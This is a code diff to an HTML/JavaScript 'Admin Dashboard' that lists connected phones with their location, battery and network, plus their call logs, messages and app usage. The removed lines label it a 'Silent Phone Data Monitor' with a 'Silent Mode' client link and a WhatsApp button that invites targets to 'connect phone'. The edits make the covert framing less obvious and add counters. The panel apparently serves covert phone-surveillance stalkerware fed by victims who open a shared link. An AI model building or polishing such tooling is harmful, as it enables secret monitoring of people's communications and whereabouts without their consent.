@@ -3,28 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Admin Dashboard - Phone Data</title>
+    <title>Admin Dashboard</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
         body{background:#0a0a0a;color:#00ff41;min-height:100vh;padding:20px;font-family:'Courier New',monospace}
         .container{max-width:1400px;margin:0 auto}
-        
         .header{display:flex;justify-content:space-between;align-items:center;padding:16px 20px;background:#0d0d0d;border-radius:12px;border:1px solid #00ff4133;margin-bottom:20px;flex-wrap:wrap;gap:10px}
         .header h1{font-size:22px;color:#00ff41}
         .header .status{display:flex;align-items:center;gap:10px;font-size:13px;color:#00ff4188}
         .header .status .dot{width:10px;height:10px;border-radius:50%;background:#00ff41;animation:pulse 2s infinite}
         @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
-
         .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:20px}
         .stat-card{background:#0d0d0d;padding:14px 18px;border-radius:10px;border:1px solid #00ff4122}
         .stat-card .num{font-size:24px;font-weight:800;color:#00ff41}
         .stat-card .label{font-size:11px;color:#00ff4188}
-
         .card{background:#0d0d0d;border-radius:12px;padding:16px;margin-bottom:16px;border:1px solid #00ff4122}
         .card h3{font-size:14px;color:#00ff41;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center}
         .card h3 span{color:#00ff4188;font-size:11px;font-weight:400}
-
         .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
         .item{display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px solid #00ff4111;font-size:12px}
         .item:last-child{border-bottom:none}
@@ -33,10 +29,8 @@
         .item .value.incoming{color:#00ff41}
         .item .value.outgoing{color:#00ffcc}
         .item .value.missed{color:#ff4444}
-
         .btn{width:100%;padding:10px;border:none;border-radius:8px;background:#00ff4122;color:#00ff41;font-weight:600;font-size:12px;cursor:pointer;transition:all 0.3s;border:1px solid #00ff4133;font-family:'Courier New',monospace}
         .btn:hover{background:#00ff4133}
-
         .client-card{background:#0d0d0d;border-radius:12px;padding:14px;border:1px solid #00ff4133;margin-bottom:10px}
         .client-card .top{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px}
         .client-card .client-name{font-size:15px;font-weight:700;color:#00ff41}
@@ -44,9 +38,10 @@
         .status-badge{padding:3px 10px;border-radius:20px;font-size:10px;font-weight:600}
         .status-badge.online{background:#00ff4122;color:#00ff41;border:1px solid #00ff41}
         .status-badge.offline{background:#ff444422;color:#ff4444;border:1px solid #ff4444}
-
         .logs{background:#000a00;padding:10px;border-radius:8px;border:1px solid #00ff4122;max-height:150px;overflow-y:auto;font-size:11px;color:#00ff4188;margin-top:10px}
         .logs .log-entry{color:#00ff41;padding:2px 0}
+        .refresh-btn{padding:4px 14px;border:none;border-radius:8px;background:#00ff4122;color:#00ff41;cursor:pointer;border:1px solid #00ff4133;font-family:'Courier New',monospace;font-size:11px}
+        .refresh-btn:hover{background:#00ff4133}
 
         @media(max-width:768px){.grid-2{grid-template-columns:1fr}}
     </style>
@@ -55,37 +50,31 @@
 
 <div class="container">
 
-    <!-- HEADER -->
     <div class="header">
         <div>
             <h1>⬛ ADMIN DASHBOARD</h1>
-            <div style="font-size:11px;color:#00ff4188;">Silent Phone Data Monitor</div>
+            <div style="font-size:11px;color:#00ff4188;">Real Phone Data Monitor</div>
         </div>
         <div class="status">
             <span class="dot"></span>
             <span id="liveStatus">🟢 Live</span>
             <span style="color:#00ff4188;margin-left:10px;font-size:11px;" id="lastUpdate">Updated: Just now</span>
-            <button class="btn" onclick="refreshDashboard()" style="width:auto;padding:4px 14px;font-size:10px;margin-left:8px;">🔄</button>
+            <button class="refresh-btn" onclick="refreshDashboard()">🔄 Refresh</button>
         </div>
     </div>
 
-    <!-- STATS -->
-    <div class="stats-grid">
+    <div class="stats-grid" id="statsGrid">
         <div class="stat-card"><div class="num" id="totalDevices">0</div><div class="label">📱 Devices</div></div>
         <div class="stat-card"><div class="num" id="totalCalls">0</div><div class="label">📞 Calls</div></div>
         <div class="stat-card"><div class="num" id="totalMsgs">0</div><div class="label">💬 Messages</div></div>
         <div class="stat-card"><div class="num" id="totalApps">0</div><div class="label">📲 Apps</div></div>
     </div>
 
-    <!-- CLIENTS -->
     <div class="card">
         <h3>📱 Connected Devices <span id="deviceCount">(0)</span></h3>
-        <div id="clientsList">
-            <div style="color:#00ff4188;text-align:center;padding:20px;font-size:13px;">⏳ Waiting for data...</div>
-        </div>
+        <div id="clientsList"><div style="color:#00ff4188;text-align:center;padding:20px;font-size:13px;">⏳ Waiting for data...</div></div>
     </div>
 
-    <!-- DATA -->
     <div class="grid-2">
         <div class="card">
             <h3>📞 Calls <span id="callCount">(0)</span></h3>
@@ -97,28 +86,22 @@
         </div>
     </div>
 
-    <!-- APPS -->
     <div class="card">
         <h3>📲 Apps <span id="appCount">(0)</span></h3>
         <div id="appsList"><div style="color:#00ff4188;font-size:12px;">No apps data</div></div>
     </div>
 
-    <!-- LOGS -->
     <div class="card">
         <h3>📋 Activity Logs</h3>
         <div class="logs" id="logs">
-            <div class="log-entry">[System] Dashboard initialized</div>
+            <div class="log-entry">[System] Dashboard ready</div>
         </div>
     </div>
 
-    <!-- SHARE LINK -->
     <div class="card" style="border-color:#00ff4166;">
-        <h3>🔗 Client Link (Silent Mode)</h3>
+        <h3>🔗 Client Link</h3>
         <div style="background:#000a00;padding:10px;border-radius:8px;border:1px dashed #00ff4133;word-break:break-all;font-size:12px;color:#00ff41;margin:6px 0;" id="shareLink">Loading...</div>
-        <div style="display:flex;gap:8px;">
-            <button class="btn" onclick="copyLink()" style="padding:8px;">📋 Copy</button>
-            <button class="btn" onclick="shareWhatsApp()" style="padding:8px;">💬 WhatsApp</button>
-        </div>
+        <button class="btn" onclick="copyLink()" style="padding:8px;">📋 Copy Link</button>
     </div>
 
 </div>
@@ -141,7 +124,6 @@
                 renderDashboard();
                 addLog('📊 Data loaded: ' + Object.keys(devices).length + ' devices');
             } else {
-                // Demo data if nothing exists
                 addLog('⏳ Waiting for client data...');
             }
         } catch(e) {
@@ -181,44 +163,28 @@
                     </div>
                     <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:8px;font-size:12px;">
                         ${d.device ? `<div><span style="color:#00ff4188;">Model:</span> <span style="color:#00ff41;">${d.device.model || 'Unknown'}</span></div>` : ''}
-                        ${d.location ? `<div><span style="color:#00ff4188;">Location:</span> <span style="color:#00ff41;">${d.location.lat || 'N/A'}, ${d.location.lng || 'N/A'}</span></div>` : ''}
                         ${d.device ? `<div><span style="color:#00ff4188;">Battery:</span> <span style="color:#00ff41;">${d.device.battery || 'N/A'}</span></div>` : ''}
-                        ${d.device ? `<div><span style="color:#00ff4188;">OS:</span> <span style="color:#00ff41;">${d.device.os || 'Unknown'}</span></div>` : ''}
+                        ${d.location ? `<div><span style="color:#00ff4188;">Location:</span> <span style="color:#00ff41;">${d.location.lat || 'N/A'}, ${d.location.lng || 'N/A'}</span></div>` : ''}
+                        ${d.network ? `<div><span style="color:#00ff4188;">Network:</span> <span style="color:#00ff41;">${d.network.type || 'N/A'}</span></div>` : ''}
                     </div>
                 </div>
             `;
 
-            // Collect calls
-            if (d.calls && d.calls.calls) {
-                allCalls = allCalls.concat(d.calls.calls);
-            }
-            // Collect messages
-            if (d.messages && d.messages.messages) {
-                allMessages = allMessages.concat(d.messages.messages);
-            }
-            // Collect apps
-            if (d.apps && d.apps.apps) {
-                allApps = allApps.concat(d.apps.apps);
-            }
+            if (d.calls && d.calls.calls) allCalls = allCalls.concat(d.calls.calls);
+            if (d.messages && d.messages.messages) allMessages = allMessages.concat(d.messages.messages);
+            if (d.apps && d.apps.apps) allApps = allApps.concat(d.apps.apps);
         });
 
         document.getElementById('clientsList').innerHTML = clientsHtml;
         document.getElementById('deviceCount').textContent = '(' + deviceIds.length + ')';
         document.getElementById('totalDevices').textContent = deviceIds.length;
 
-        // Render calls
         renderCalls(allCalls);
-        // Render messages
         renderMessages(allMessages);
-        // Render apps
         renderApps(allApps);
-
         updateStats();
     }
 
-    // ==========================================
-    // RENDER CALLS
-    // ==========================================
     function renderCalls(calls) {
         const container = document.getElementById('callsList');
         if (!calls || calls.length === 0) {
@@ -233,11 +199,9 @@
                 <span style="color:#00ff4188;font-size:10px;">${c.duration || '0s'}</span>
             </div>
         `).join('');
+        document.getElementById('totalCalls').textContent = calls.length;
     }
 
-    // ==========================================
-    // RENDER MESSAGES
-    // ==========================================
     function renderMessages(messages) {
         const container = document.getElementById('messagesList');
         if (!messages || messages.length === 0) {
@@ -252,11 +216,9 @@
                 <span style="color:#00ff4188;font-size:10px;">${m.time || ''}</span>
             </div>
         `).join('');
+        document.getElementById('totalMsgs').textContent = messages.length;
     }
 
-    // ==========================================
-    // RENDER APPS
-    // ==========================================
     function renderApps(apps) {
         const container = document.getElementById('appsList');
         if (!apps || apps.length === 0) {
@@ -266,15 +228,13 @@
         document.getElementById('appCount').textContent = '(' + apps.length + ')';
         container.innerHTML = apps.slice(0, 10).map(a => `
             <div class="item">
-                <span class="label">${a.name || 'Unknown'}</span>
+                <span class="label">${a.icon || '📱'} ${a.name || 'Unknown'}</span>
                 <span class="value" style="color:${a.active ? '#00ff41' : '#00ff4188'};">${a.active ? '●' : '○'} ${a.time || '0m'}</span>
             </div>
         `).join('');
+        document.getElementById('totalApps').textContent = apps.filter(a => a.active).length;
     }
 
-    // ==========================================
-    // UPDATE STATS
-    // ==========================================
     function updateStats() {
         const deviceIds = Object.keys(devices);
         let totalCalls = 0, totalMsgs = 0, totalApps = 0;
@@ -282,20 +242,18 @@
             const d = devices[id];
             if (d.calls && d.calls.calls) totalCalls += d.calls.calls.length;
             if (d.messages && d.messages.messages) totalMsgs += d.messages.messages.length;
-            if (d.apps && d.apps.apps) totalApps += d.apps.apps.length;
+            if (d.apps && d.apps.apps) totalApps += d.apps.apps.filter(a => a.active).length;
         });
         document.getElementById('totalCalls').textContent = totalCalls;
         document.getElementById('totalMsgs').textContent = totalMsgs;
         document.getElementById('totalApps').textContent = totalApps;
     }
 
-    // ==========================================
-    // REFRESH DASHBOARD
-    // ==========================================
     function refreshDashboard() {
         loadData();
         document.getElementById('lastUpdate').textContent = 'Updated: ' + new Date().toLocaleTimeString();
         addLog('🔄 Dashboard refreshed');
+        toast('🔄 Refreshed!');
     }
 
     // ==========================================
@@ -311,23 +269,12 @@
         navigator.clipboard.writeText(link).then(() => toast('✅ Link copied!'));
     }
 
-    function shareWhatsApp() {
-        const link = document.getElementById('shareLink').textContent;
-        const msg = encodeURIComponent('📱 Click to connect phone:\n' + link);
-        window.open('https://wa.me/?text=' + msg, '_blank');
-    }
-
     // ==========================================
     // TOAST
     // ==========================================
     function toast(msg) {
         const t = document.createElement('div');
-        t.style.cssText = `
-            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
-            background: #001a00; color: #00ff41; padding: 10px 20px; border-radius: 8px;
-            font-size: 12px; z-index: 9999; border: 1px solid #00ff4133;
-            font-family: 'Courier New', monospace;
-        `;
+        t.style.cssText = `position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#001a00;color:#00ff41;padding:10px 20px;border-radius:8px;font-size:12px;z-index:9999;border:1px solid #00ff4133;font-family:'Courier New',monospace;`;
         t.textContent = msg;
         document.body.appendChild(t);
         setTimeout(() => { t.style.opacity = '0'; t.style.transition = 'opacity 0.3s'; setTimeout(() => t.remove(), 300); }, 2000);
@@ -361,17 +308,14 @@
     function init() {
         updateShareLink();
         loadData();
-        addLog('🟢 Dashboard ready - waiting for devices');
+        addLog('🟢 Dashboard ready');
         console.log('⬛ Admin Dashboard Loaded');
     }
 
-    // Expose functions
     window.copyLink = copyLink;
-    window.shareWhatsApp = shareWhatsApp;
     window.refreshDashboard = refreshDashboard;
 
     init();
 </script>
-
 </body>
 </html>
